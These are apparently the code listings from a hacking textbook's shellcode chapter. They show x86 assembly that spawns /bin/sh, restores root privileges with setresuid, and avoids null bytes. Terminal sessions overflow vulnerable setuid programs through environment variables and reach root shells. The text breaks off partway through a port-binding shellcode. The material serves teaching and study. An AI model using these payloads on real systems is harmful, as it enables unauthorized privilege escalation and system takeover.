["```\n#include <stdio.h>\nint main() {\n  printf(\"Hello, world!\\n\");\n  return 0;\n}\n```", "```\nreader@hacking:~/booksrc $ gcc helloworld.c\nreader@hacking:~/booksrc $ strace ./a.out\nexecve(\"./a.out\", [\"./a.out\"], [/* 27 vars */]) = 0\nbrk(0)                                  = 0x804a000\naccess(\"/etc/ld.so.nohwcap\", F_OK)      = -1 ENOENT (No such file or directory)\nmmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ef6000\naccess(\"/etc/ld.so.preload\", R_OK)      = -1 ENOENT (No such file or directory)\nopen(\"/etc/ld.so.cache\", O_RDONLY)      = 3\nfstat64(3, {st_mode=S_IFREG|0644, st_size=61323, ...}) = 0\nmmap2(NULL, 61323, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7ee7000\nclose(3)                                = 0\naccess(\"/etc/ld.so.nohwcap\", F_OK)      = -1 ENOENT (No such file or directory)\nopen(\"/lib/tls/i686/cmov/libc.so.6\", O_RDONLY) = 3\nread(3, \"\\177ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\\3\\0\\1\\0\\0\\0\\20Z\\1\\000\"..., 512) = 512\nfstat64(3, {st_mode=S_IFREG|0755, st_size=1248904, ...}) = 0\nmmap2(NULL, 1258876, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7db3000\nmmap2(0xb7ee0000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3,\n 0x12c) =\n0xb7ee0000\nmmap2(0xb7ee4000, 9596, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) =\n\n0xb7ee4000\nclose(3)                                = 0\nmmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7db2000\nset_thread_area({entry_number:-1 -> 6, base_addr:0xb7db26b0, limit:1048575, seg_32bit:1,\ncontents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0\nmprotect(0xb7ee0000, 8192, PROT_READ)   = 0\nmunmap(0xb7ee7000, 61323)               = 0\nfstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 2), ...}) = 0\nmmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ef5000\n`write(1, \"Hello, world!\\n\", 13Hello, world! )          = 13`\nexit_group(0)                           = ?\nProcess 11528 detached\nreader@hacking:~/booksrc $\n```", "```\nWRITE(2)                   Linux Programmer's Manual\nWRITE(2)\n\nNAME\n       write - write to a file descriptor\n\nSYNOPSIS\n       #include <unistd.h>\n\n       ssize_t write(int fd, const void *buf, size_t count);\n\nDESCRIPTION\n       write() writes up to count bytes to the file referenced by the file\n       descriptor fd from the buffer starting at buf. POSIX requires that a\n       read() which can be proved to occur after a write() returns the new\n       data. Note that not all file systems are POSIX conforming.\n```", "```\n/* Standard file descriptors. */\n#define STDIN_FILENO  0 /* Standard input.  */\n#define STDOUT_FILENO 1 /* Standard output.  */\n#define STDERR_FILENO 2 /* Standard error output. */\n```", "```\n#ifndef _ASM_I386_UNISTD_H_\n#define _ASM_I386_UNISTD_H_\n\n/*\n * This file contains the system call numbers.\n */\n\n#define __NR_restart_syscall      0\n`#define __NR_exit       1`\n#define __NR_fork       2\n#define __NR_read       3\n`#define __NR_write      4`\n#define __NR_open       5\n#define __NR_close      6\n#define __NR_waitpid    7\n#define __NR_creat      8\n#define __NR_link       9\n#define __NR_unlink    10\n#define __NR_execve    11\n#define __NR_chdir     12\n#define __NR_time      13\n#define __NR_mknod     14\n#define __NR_chmod     15\n#define __NR_lchown    16\n#define __NR_break     17\n#define __NR_oldstat   18\n#define __NR_lseek     19\n#define __NR_getpid    20\n#define __NR_mount     21\n#define __NR_umount    22\n#define __NR_setuid    23\n#define __NR_getuid    24\n#define __NR_stime     25\n#define __NR_ptrace    26\n#define __NR_alarm     27\n#define __NR_oldfstat  28\n#define __NR_pause     29\n#define __NR_utime     30\n#define __NR_stty      31\n#define __NR_gtty      32\n#define __NR_access    33\n#define __NR_nice      34\n#define __NR_ftime     35\n#define __NR_sync      36\n#define __NR_kill      37\n#define __NR_rename    38\n#define __NR_mkdir     39\n...\n```", "```\nsection .data       ;  Data segment\nmsg     db      \"Hello,  world!\", 0x0a   ;  The string and newline char\n\nsection .text       ; Text segment\nglobal _start       ; Default entry point for ELF linking\n\n_start:\n\n; SYSCALL: write(1, msg, 14)\nmov eax, 4        ; Put 4 into eax, since write is syscall #4.\nmov ebx, 1        ; Put 1 into ebx, since stdout is 1.\nmov ecx, msg      ; Put the address of the string into ecx.\nmov edx, 14       ; Put 14 into edx, since our string is 14 bytes.\nint 0x80          ; Call the kernel to make the system call happen.\n\n; SYSCALL: exit(0)\nmov eax, 1        ; Put 1 into eax, since exit is syscall #1.\nmov ebx, 0        ; Exit with success.\nint 0x80          ; Do the syscall.\n```", "```\nreader@hacking:~/booksrc $ nasm -f elf helloworld.asm\nreader@hacking:~/booksrc $ ld helloworld.o\nreader@hacking:~/booksrc $ ./a.out\nHello, world!\nreader@hacking:~/booksrc $\n```", "```\nBITS 32             ;  Tell nasm this is 32-bit code.\n\n  call mark_below   ;  Call below the string to instructions\n  db \"Hello, world!\",  0x0a, 0x0d  ; with newline and carriage return bytes.\n\nmark_below:\n; ssize_t write(int fd,  const void *buf, size_t count);\n  pop ecx           ; Pop  the return address (string ptr) into ecx.\n  mov eax, 4        ; Write  syscall #.\n  mov ebx, 1        ; STDOUT  file descriptor\n  mov edx, 15       ; Length of the string\n  int 0x80          ; Do syscall: write(1, string, 14)\n\n; void _exit(int status);\n  mov eax, 1        ; Exit syscall #\n  mov ebx, 0        ; Status = 0\n  int 0x80          ; Do syscall:  exit(0)\n```", "```\nreader@hacking:~/booksrc $ nasm helloworld1.s\nreader@hacking:~/booksrc $ ls -l helloworld1\n-rw-r--r-- 1 reader reader 50 2007-10-26 08:30 helloworld1\nreader@hacking:~/booksrc $ hexdump -C helloworld1\n00000000  e8 0f 00 00 00 48 65 6c  6c 6f 2c 20 77 6f 72 6c  |.....Hello, worl|\n00000010  64 21 0a 0d 59 b8 04 00  00 00 bb 01 00 00 00 ba  |d!..Y...........|\n00000020  0f 00 00 00 cd 80 b8 01  00 00 00 bb 00 00 00 00  |................|\n00000030  cd 80                                             |..|\n00000032\nreader@hacking:~/booksrc $ ndisasm -b32 helloworld1\n00000000  E80F`000000`        call 0x14\n00000005  48                dec eax\n00000006  656C              gs insb\n00000008  6C                insb\n00000009  6F                outsd\n0000000A  2C20              sub al,0x20\n0000000C  776F              ja 0x7d\n0000000E  726C              jc 0x7c\n00000010  64210A            and [fs:edx],ecx\n00000013  0D59B80400        or eax,0x4b859\n00000018  0000              add [eax],al\n0000001A  BB01000000        mov ebx,0x1\n0000001F  BA0F000000        mov edx,0xf\n00000024  CD80              int 0x80\n00000026  B801000000        mov eax,0x1\n0000002B  BB00000000        mov ebx,0x0\n00000030  CD80              int 0x80\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat helloworld1)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch\nSHELLCODE will be at 0xbffff9c6\nreader@hacking:~/booksrc $ ./notesearch $(perl -e 'print \"\\xc6\\xf9\\xff\\xbf\"x40')\n-------[ end of note data ]-------\nSegmentation fault\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ sudo su\nroot@hacking:/home/reader/booksrc # ulimit -c unlimited\nroot@hacking:/home/reader/booksrc # export SHELLCODE=$(cat helloworld1)\nroot@hacking:/home/reader/booksrc # ./getenvaddr SHELLCODE ./notesearch\nSHELLCODE will be at 0xbffff9a3\nroot@hacking:/home/reader/booksrc # ./notesearch $(perl -e 'print \"\\xa3\\xf9\\\nxff\\xbf\"x40')\n-------[ end of note data ]-------\nSegmentation fault (core dumped)\nroot@hacking:/home/reader/booksrc # ls -l ./core\n-rw------- 1 root root 147456 2007-10-26 08:36 ./core\nroot@hacking:/home/reader/booksrc # gdb -q -c ./core\n(no debugging symbols found)\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\nCore was generated by './notesearch\n£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E.\nProgram terminated with signal 11, Segmentation fault.\n#0  0x2c6541b7 in ?? ()\n(gdb) set dis intel\n(gdb) x/5i 0xbffff9a3\n0xbffff9a3:     call   0x2c6541b7\n0xbffff9a8:     ins    BYTE PTR es:[edi],[dx]\n0xbffff9a9:     outs   [dx],DWORD PTR ds:[esi]\n0xbffff9aa:     sub    al,0x20\n0xbffff9ac:     ja     0xbffffa1d\n(gdb) i r eip\neip            0x2c6541b7        0x2c6541b7\n(gdb) x/32xb 0xbffff9a3\n0xbffff9a3:     0xe8    0x0f    0x48    0x65    0x6c    0x6c    0x6f    0x2c\n0xbffff9ab:     0x20    0x77    0x6f    0x72    0x6c    0x64    0x21    0x0a\n0xbffff9b3:     0x0d    0x59    0xb8    0x04    0xbb    0x01    0xba    0x0f\n0xbffff9bb:     0xcd    0x80    0xb8    0x01    0xbb    0xcd    0x80    0x00\n(gdb) quit\nroot@hacking:/home/reader/booksrc # hexdump -C helloworld1\n00000000  e8 0f 00 00 00 48 65 6c  6c 6f 2c 20 77 6f 72 6c  |.....Hello, worl|\n00000010  64 21 0a 0d 59 b8 04 00  00 00 bb 01 00 00 00 ba  |d!..Y...........|\n00000020  0f 00 00 00 cd 80 b8 01  00 00 00 bb 00 00 00 00  |................|\n00000030  cd 80                                             |..|\n00000032\nroot@hacking:/home/reader/booksrc #\n```", "```\nreader@hacking:~/booksrc $ ndisasm -b32 helloworld1\n00000000  E80F`000000`        call 0x14\n00000005  48                dec eax\n00000006  656C              gs insb\n00000008  6C                insb\n00000009  6F                outsd\n0000000A  2C20              sub al,0x20\n0000000C  776F              ja 0x7d\n0000000E  726C              jc 0x7c\n00000010  64210A            and [fs:edx],ecx\n00000013  0D59B80400        or eax,0x4b859\n00000018  0000              add [eax],al\n0000001A  BB01000000        mov ebx,0x1\n0000001F  BA0F000000        mov edx,0xf\n00000024  CD80              int 0x80\n00000026  B801000000        mov eax,0x1\n0000002B  BB00000000        mov ebx,0x0\n00000030  CD80              int 0x80\nreader@hacking:~/booksrc $\n```", "```\nBITS 32             ;  Tell nasm this is 32-bit code.\n\n`jmp short one       ;  Jump down to a call at the end.  two:`\n; ssize_t write(int fd,  const void *buf, size_t count);\n  pop ecx           ;  Pop the return address (string ptr) into ecx.\n  mov eax, 4        ;  Write syscall #.\n  mov ebx, 1        ;  STDOUT file descriptor\n  mov edx, 15       ;  Length of the string\n  int 0x80          ;  Do syscall: write(1, string, 14)\n\n; void _exit(int status);\n  mov eax, 1        ; Exit syscall #\n  mov ebx, 0        ; Status = 0\n  int 0x80          ; Do syscall: exit(0)\n\n`one:   call two   ; Call back upwards to avoid null bytes   db \"Hello, world!\", 0x0a, 0x0d ; with newline and carriage return bytes.`\n```", "```\nreader@hacking:~/booksrc $ nasm helloworld2.s\nreader@hacking:~/booksrc $ ndisasm -b32 helloworld2\n00000000  EB1E              jmp short 0x20\n00000002  59                pop ecx\n00000003  B804`000000`        mov eax,0x4\n00000008  BB01`000000`        mov ebx,0x1\n0000000D  BA0F`000000`        mov edx,0xf\n00000012  CD80              int 0x80\n00000014  B801`000000`        mov eax,0x1\n00000019  BB`00000000`        mov ebx,0x0\n0000001E  CD80              int 0x80\n*`00000020  E8DDFFFFFF        call 0x2`*\n00000025  48                dec eax\n00000026  656C              gs insb\n00000028  6C                insb\n00000029  6F                outsd\n0000002A  2C20              sub al,0x20\n0000002C  776F              ja 0x9d\n0000002E  726C              jc 0x9c\n00000030  64210A            and [fs:edx],ecx\n00000033  0D                db 0x0D\nreader@hacking:~/booksrc $\n```", "```\n\tEB 1E              jmp short 0x20\n```", "```\n\tE9 1E 00 00 00     jmp 0x23\n```", "```\n\tB8 44 33 22 11        mov eax,0x11223344\n\t2D 44 33 22 11        sub eax,0x11223344\n```", "```\n\t29 C0               sub eax,eax\n```", "```\n\t31 C0                 xor eax,eax\n```", "```\nBITS 32             ;  Tell nasm this is 32-bit code.\n\njmp short one       ;  Jump down to a call at the end.\n\ntwo:\n; ssize_t write(int fd,  const void *buf, size_t count);\n  pop ecx           ; Pop  the return address (string ptr) into ecx.\n  xor eax, eax      ; Zero  out full 32 bits of eax register.\n  mov al, 4         ; Write  syscall #4 to the low byte of eax.\n  xor ebx, ebx      ; Zero out ebx.\n  inc ebx           ; Increment ebx to 1,  STDOUT file descriptor.\n  xor edx, edx\n  mov dl, 15        ; Length of the string\n  int 0x80          ; Do syscall: write(1, string, 14)\n\n; void _exit(int status);\n  mov al, 1        ; Exit syscall #1, the top 3 bytes are still zeroed.\n  dec ebx          ; Decrement ebx back down to 0 for status = 0.\n  int 0x80         ; Do syscall: exit(0)\n\none:\n  call two   ; Call back upwards to avoid null bytes\n  db \"Hello, world!\", 0x0a, 0x0d  ; with newline and carriage return bytes.\n```", "```\nreader@hacking:~/booksrc $ nasm helloworld3.s\nreader@hacking:~/booksrc $ hexdump -C helloworld3 | grep --color=auto 00\n00000000  eb 13 59 31 c0 b0 04 31  db 43 31 d2 b2 0f cd 80  |..Y1...1.C1.....|\n00000010  b0 01 4b cd 80 e8 e8 ff  ff ff 48 65 6c 6c 6f 2c  |..K.......Hello,|\n00000020  20 77 6f 72 6c 64 21 0a  0d                       | world!..|\n00000029\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat helloworld3)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch\nSHELLCODE will be at 0xbffff9bc\nreader@hacking:~/booksrc $ ./notesearch $(perl -e 'print \"\\xbc\\xf9\\xff\\xbf\"x40')\n[DEBUG] found a 33 byte note for user id 999\n-------[ end of note data ]-------\nHello, world!\nreader@hacking :~/booksrc $\n```", "```\nEXECVE(2)                  Linux Programmer's Manual                 EXECVE(2)\n\nNAME\n       execve - execute program\n\nSYNOPSIS\n       #include <unistd.h>\n\n       int execve(const char *filename, char *const argv[],\n                  char *const envp[]);\n\nDESCRIPTION\n       execve() executes the program pointed to by filename. Filename must be\n       either a binary executable, or a script starting with a line of  the\n       form  \"#! interpreter [arg]\". In the latter case, the interpreter must\n       be a valid pathname for an executable which is not itself a  script,\n       which will be invoked as interpreter [arg] filename.\n\n       argv is an array of argument strings passed to the new program. envp\n       is an array of strings, conventionally of the form key=value, which are\n       passed as environment to the new program. Both argv and envp must be\n       terminated by a null pointer. The argument vector and environment can\n       be accessed by the called program's main function, when it is defined\n       as int main(int argc, char *argv[], char *envp[]).\n```", "```\n#include <unistd.h>\n\nint main() {\n  char filename[] = \"/bin/sh\\x00\";\n  char **argv, **envp; // Arrays that contain char pointers\n\n  argv[0] = filename; // The only argument is filename.\n  argv[1] = 0;  // Null terminate the argument array.\n\n  envp[0] = 0; // Null terminate the environment array.\n\n  execve(filename, argv, envp);\n}\n```", "```\n\t89 43 0C             mov [ebx+12],eax\n```", "```\nBITS 32\n\n  jmp short two     ; Jump down to the bottom for the call trick.\none:\n; int execve(const char *filename, char *const argv [], char *const envp[])\n  pop ebx           ; Ebx has the addr of the string.\n  xor eax, eax      ; Put 0 into eax.\n  mov [ebx+7], al   ; Null terminate the /bin/sh string.\n  mov [ebx+8], ebx  ; Put addr from ebx where the AAAA is.\n  mov [ebx+12], eax ; Put 32-bit null terminator where the BBBB is.\n  `lea ecx, [ebx+8]  ; Load the address of [ebx+8] into ecx for argv ptr.`\n  lea edx, [ebx+12] ; Edx = ebx + 12, which is the envp ptr.\n  mov al, 11        ; Syscall #11\n  int 0x80          ; Do it.\n\ntwo:\n  call one          ; Use a call to get string address.\n  db '/bin/shXAAAABBBB'     ; The XAAAABBBB bytes aren't needed.\n```", "```\nreader@hacking:~/booksrc $ nasm exec_shell.s\nreader@hacking:~/booksrc $ wc -c exec_shell\n36 exec_shell\nreader@hacking:~/booksrc $ hexdump -C exec_shell\n00000000  eb 16 5b 31 c0 88 43 07  89 5b 08 89 43 0c 8d 4b  |..[1..C..[..C..K|\n00000010  08 8d 53 0c b0 0b cd 80  e8 e5 ff ff ff 2f 62 69  |..S........../bi|\n00000020  6e 2f 73 68                                       |n/sh|\n00000024\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat exec_shell)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch\nSHELLCODE will be at 0xbffff9c0\nreader@hacking:~/booksrc $ ./notesearch $(perl -e 'print \"\\xc0\\xf9\\xff\\xbf\"x40')\n[DEBUG] found a 34 byte note for user id 999\n[DEBUG] found a 41 byte note for user id 999\n[DEBUG] found a 5 byte note for user id 999\n[DEBUG] found a 35 byte note for user id 999\n[DEBUG] found a 9 byte note for user id 999\n[DEBUG] found a 33 byte note for user id 999\n-------[ end of note data ]-------\nsh-3.2# whoami\nroot\nsh-3.2#\n```", "```\nreader@hacking:~/booksrc/shellcodes $ hexdump -C exec_shell\n00000000  eb 16 5b 31 c0 88 43 07  89 5b 08 89 43 0c 8d 4b  |..[1..C..[..C..K|\n00000010  08 8d 53 0c b0 0b cd 80  e8 e5 ff ff ff 2f 62 69  |..S........../bi|\n00000020  6e 2f 73 68                                       |n/sh|\n00000024\nreader@hacking:~/booksrc/shellcodes $ wc -c exec_shell\n36 exec_shell\nreader@hacking:~/booksrc/shellcodes $\n```", "```\nBITS 32\n\n; execve(const char *filename, char *const argv [], char *const envp[])\n  xor eax, eax      ; Zero out eax.\n  push eax          ; Push some nulls for string termination.\n  push 0x68732f2f   ; Push \"//sh\" to the stack.\n  push 0x6e69622f   ; Push \"/bin\" to the stack.\n  mov ebx, esp      ; Put the address of \"/bin//sh\" into ebx, via esp.\n  push eax          ; Push 32-bit null terminator to stack.\n  mov edx, esp      ; This is an empty array for envp.\n  push ebx          ; Push string addr to stack above null terminator.\n  mov ecx, esp      ; This is the argv array with string ptr.\n  mov al, 11        ; Syscall #11.\n  int 0x80          ; Do it.\n```", "```\nreader@hacking:~/booksrc $ nasm tiny_shell.s \nreader@hacking:~/booksrc $ wc -c tiny_shell\n25 tiny_shell\nreader@hacking:~/booksrc $ hexdump -C tiny_shell\n00000000  31 c0 50 68 2f 2f 73 68  68 2f 62 69 6e 89 e3 50  |1.Ph//shh/bin..P|\n00000010  89 e2 53 89 e1 b0 0b cd  80                       |..S......|\n00000019\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat tiny_shell)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch\nSHELLCODE will be at 0xbffff9cb\nreader@hacking:~/booksrc $ ./notesearch $(perl -e 'print \"\\xcb\\xf9\\xff\\xbf\"x40')\n[DEBUG] found a 34 byte note for user id 999\n[DEBUG] found a 41 byte note for user id 999\n[DEBUG] found a 5 byte note for user id 999\n[DEBUG] found a 35 byte note for user id 999\n[DEBUG] found a 9 byte note for user id 999\n[DEBUG] found a 33 byte note for user id 999\n-------[ end of note data ]-------\nsh-3.2#\n```", "```\nSETEGID(2)                 Linux Programmer's Manual                SETEGID(2)\n\nNAME\n       seteuid, setegid - set effective user or group ID\n\nSYNOPSIS\n       #include <sys/types.h>\n       #include <unistd.h>\n\n       int seteuid(uid_t euid);\n       int setegid(gid_t egid);\n\nDESCRIPTION\n       seteuid() sets the effective user ID of the current process.\n       Unprivileged user processes may only set the effective user ID to\n       ID to the real user ID, the effective user ID or the saved set-user-ID.\n       Precisely the same holds for setegid() with \"group\" instead of \"user\".\n\nRETURN VALUE\n       On success, zero is returned. On error, -1 is returned, and errno is\n       set appropriately.\n```", "```\n#include <unistd.h>\nvoid lowered_privilege_function(unsigned char *ptr) {\n   char buffer[50];\n   seteuid(5);  // Drop privileges to games user.\n   strcpy(buffer, ptr);\n}\nint main(int argc, char *argv[]) {\n   if (argc > 0)\n      lowered_privilege_function(argv[1]);\n}\n```", "```\nreader@hacking:~/booksrc $ gcc -o drop_privs drop_privs.c\nreader@hacking:~/booksrc $ sudo chown root ./drop_privs; sudo chmod u+s ./drop_privs\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat tiny_shell)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./drop_privs\nSHELLCODE will be at 0xbffff9cb\nreader@hacking:~/booksrc $ ./drop_privs $(perl -e 'print \"\\xcb\\xf9\\xff\\xbf\"x40')\nsh-3.2$ whoami\ngames\nsh-3.2$ id\nuid=999(reader) gid=999(reader) euid=5(games)\ngroups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),\n104(scan\nner),112(netdev),113(lpadmin),115(powerdev),117(admin),999(reader)\nsh-3.2$\n```", "```\nreader@hacking:~/booksrc $ grep -i setresuid /usr/include/asm-i386/unistd.h\n`#define __NR_setresuid          164`\n#define __NR_setresuid32        208\nreader@hacking:~/booksrc $ man 2 setresuid\n SETRESUID(2)               Linux Programmer's Manual              SETRESUID(2)\n\nNAME\n       setresuid, setresgid - set real, effective and saved user or group ID\n\nSYNOPSIS\n       #define _GNU_SOURCE\n       #include <unistd.h>\n\n       int setresuid(uid_t ruid, uid_t euid, uid_t suid);\n       int setresgid(gid_t rgid, gid_t egid, gid_t sgid);\n\nDESCRIPTION\n       setresuid() sets the real user ID, the effective user ID, and the saved\n       set-user-ID of the current process.\n```", "```\nBITS 32\n\n; setresuid(uid_t ruid, uid_t euid, uid_t suid);\n  xor eax, eax      ; Zero out eax.\n  xor ebx, ebx      ; Zero out ebx.\n  xor ecx, ecx      ; Zero out ecx.\n  xor edx, edx      ; Zero out edx.\n  mov al,  0xa4     ; 164 (0xa4) for syscall #164\n  int 0x80          ; setresuid(0, 0, 0)  Restore all root privs.\n\n; execve(const char *filename, char *const argv [], char *const envp[])\n  xor eax, eax      ; Make sure eax is zeroed again.\n  mov al, 11        ; syscall #11\n  push ecx          ; push some nulls for string termination.\n  push 0x68732f2f   ; push \"//sh\" to the stack.\n  push 0x6e69622f   ; push \"/bin\" to the stack.\n  mov ebx, esp      ; Put the address of \"/bin//sh\" into ebx via esp.\n  push ecx          ; push 32-bit null terminator to stack.\n  mov edx, esp      ; This is an empty array for envp.\n  push ebx          ; push string addr to stack above null terminator.\n  mov ecx, esp      ; This is the argv array with string ptr.\n  int 0x80          ; execve(\"/bin//sh\", [\"/bin//sh\", NULL], [NULL])\n```", "```\nreader@hacking:~/booksrc $ nasm priv_shell.s\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat priv_shell)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./drop_privs\nSHELLCODE will be at 0xbffff9bf\nreader@hacking:~/booksrc $ ./drop_privs $(perl -e 'print \"\\xbf\\xf9\\xff\\xbf\"x40')\nsh-3.2# whoami\nroot\nsh-3.2# id\nuid=0(root) gid=999(reader)\ngroups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),\n104(scan\nner),112(netdev),113(lpadmin),115(powerdev),117(admin),999(reader)\nsh-3.2#\n```", "```\n\t`31 D2`            xor edx,edx\n```", "```\n\t`99`               cdq\n```", "```\n\t`31 C0`            xor eax,eax\n\t`B0 0B`            mov al,0xb\n```", "```\n\t`6A 0B`            push byte +0xb\n\t`58`               pop eax\n```", "```\nBITS 32\n\n; setresuid(uid_t ruid, uid_t euid, uid_t suid);\n  xor eax, eax      ; Zero out eax.\n  xor ebx, ebx      ; Zero out ebx.\n  xor ecx, ecx      ; Zero out ecx.\n  `cdq               ; Zero out edx using the sign bit from eax.`\n  mov BYTE al, 0xa4 ; syscall 164 (0xa4)\n  int 0x80          ; setresuid(0, 0, 0)  Restore all root privs.\n\n; execve(const char *filename, char *const argv [], char *const envp[])\n  `push BYTE 11      ; push 11 to the stack.   pop eax           ; pop the dword of 11 into eax.`\n  push ecx          ; push some nulls for string termination.\n  push 0x68732f2f   ; push \"//sh\" to the stack.\n  push 0x6e69622f   ; push \"/bin\" to the stack.\n  mov ebx, esp      ; Put the address of \"/bin//sh\" into ebx via esp.\n  push ecx          ; push 32-bit null terminator to stack.\n  mov edx, esp      ; This is an empty array for envp.\n  push ebx          ; push string addr to stack above null terminator.\n  mov ecx, esp      ; This is the argv array with string ptr.\n  int 0x80          ; execve(\"/bin//sh\", [\"/bin//sh\", NULL], [NULL])\n```", "```\n#include <unistd.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n\nint main(void) {\n   int sockfd, new_sockfd;  // Listen on sock_fd, new connection on new_fd\n   struct sockaddr_in host_addr, client_addr;   // My address information\n   socklen_t sin_size;\n   int yes=1;\n\n   sockfd = socket(PF_INET, SOCK_STREAM, 0);\n\n   host_addr.sin_family = AF_INET;         // Host byte order\n   host_addr.sin_port = htons(31337);      // Short, network byte order\n   host_addr.sin_addr.s_addr = INADDR_ANY; // Automatically fill with my IP.\n   memset(&(host_addr.sin_zero), '\\0', 8); // Zero the rest of the struct.\n\n   bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr));\n\n   listen(sockfd, 4);\n   sin_size = sizeof(struct sockaddr_in);\n   new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);\n}\n```", "```\nreader@hacking:~/booksrc $ grep socketcall /usr/include/asm-i386/unistd.h\n#define __NR_socketcall         102\nreader@hacking:~/booksrc $ man 2 socketcall\nIPC(2)                     Linux Programmer's Manual                     IPC(2)\n\nNAME\n       socketcall - socket system calls\n\nSYNOPSIS\n       int socketcall(int call, unsigned long *args);\n\nDESCRIPTION\n       socketcall() is a common kernel entry point for the socket system calls. call\n       determines which socket function to invoke. args points to a block containing\n       the actual arguments, which are passed through to the appropriate call.\n\n       User programs should call  the  appropriate  functions  by  their  usual\n       names.   Only  standard  library implementors and kernel hackers need to\n       know about socketcall().\n```", "```\n#define SYS_SOCKET  1   /* sys_socket(2)    */\n#define SYS_BIND  2   /* sys_bind(2)      */\n#define SYS_CONNECT 3   /* sys_connect(2)   */\n#define SYS_LISTEN  4   /* sys_listen(2)    */\n#define SYS_ACCEPT  5   /* sys_accept(2)    */\n#define SYS_GETSOCKNAME 6   /* sys_getsockname(2)   */\n#define SYS_GETPEERNAME 7   /* sys_getpeername(2)   */\n#define SYS_SOCKETPAIR  8   /* sys_socketpair(2)    */\n#define SYS_SEND  9   /* sys_send(2)      */\n#define SYS_RECV  10    /* sys_recv(2)      */\n#define SYS_SENDTO  11    /* sys_sendto(2)    */\n#define SYS_RECVFROM  12    /* sys_recvfrom(2)    */\n#define SYS_SHUTDOWN  13    /* sys_shutdown(2)    */\n#define SYS_SETSOCKOPT  14    /* sys_setsockopt(2)    */\n#define SYS_GETSOCKOPT  15    /* sys_getsockopt(2)    */\n#define SYS_SENDMSG 16    /* sys_sendmsg(2)   */\n#define SYS_RECVMSG 17    /* sys_recvmsg(2)   */\n```", "```\nreader@hacking:~/booksrc $ gcc -g bind_port.c\nreader@hacking:~/booksrc $ gdb -q ./a.out\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) list 18\n13         sockfd = socket(PF_INET, SOCK_STREAM, 0);\n14\n15         host_addr.sin_family = AF_INET;         // Host byte order\n16         host_addr.sin_port = htons(31337);      // Short, network byte order\n17         host_addr.sin_addr.s_addr = INADDR_ANY; // Automatically fill with my IP.\n18         memset(&(host_addr.sin_zero), '\\0', 8); // Zero the rest of the struct.\n19\n20         bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr));\n21\n22         listen(sockfd, 4);\n(gdb) break 13\nBreakpoint 1 at 0x804849b: file bind_port.c, line 13.\n(gdb) break 20\nBreakpoint 2 at 0x80484f5: file bind_port.c, line 20.\n(gdb) run\nStarting program: /home/reader/booksrc/a.out\n\nBreakpoint 1, main () at bind_port.c:13\n13         sockfd = socket(PF_INET, SOCK_STREAM, 0);\n(gdb) x/5i $eip\n0x804849b <main+23>:    mov    DWORD PTR [esp+8],0x0\n0x80484a3 <main+31>:    mov    DWORD PTR [esp+4],0x1\n0x80484ab <main+39>:    mov    DWORD PTR [esp],0x2\n0x80484b2 <main+46>:    call   0x8048394 <socket@plt>\n0x80484b7 <main+51>:    mov    DWORD PTR [ebp-12],eax\n(gdb)\n```", "```\n(gdb) cont\nContinuing.\n\nBreakpoint 2, main () at bind_port.c:20\n20         bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr));\n(gdb) print host_addr\n$1 = {sin_family = 2, sin_port = 27002, sin_addr = {s_addr = 0},\n  sin_zero = \"\\000\\000\\000\\000\\000\\000\\000\"}\n(gdb) print sizeof(struct sockaddr)\n$2 = 16\n(gdb) x/16xb &host_addr\n0xbffff780:     `0x02    0x00    0x7a    0x69    0x00    0x00    0x00    0x00`\n0xbffff788:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n(gdb) p /x 27002\n$3 = 0x697a\n(gdb) p 0x7a69\n$4 = 31337\n(gdb)\n```", "```\nBITS 32\n\n; s = socket(2, 1, 0)\n  push BYTE 0x66    ; socketcall is syscall #102 (0x66).\n  pop eax\n  cdq               ; Zero out edx for use as a null DWORD later.\n  xor ebx, ebx      ; ebx is the type of socketcall.\n  inc ebx           ; 1 = SYS_SOCKET = socket()\n  push edx          ; Build arg array: { protocol = 0,\n  push BYTE 0x1     ;   (in reverse)     SOCK_STREAM = 1,\n  push BYTE 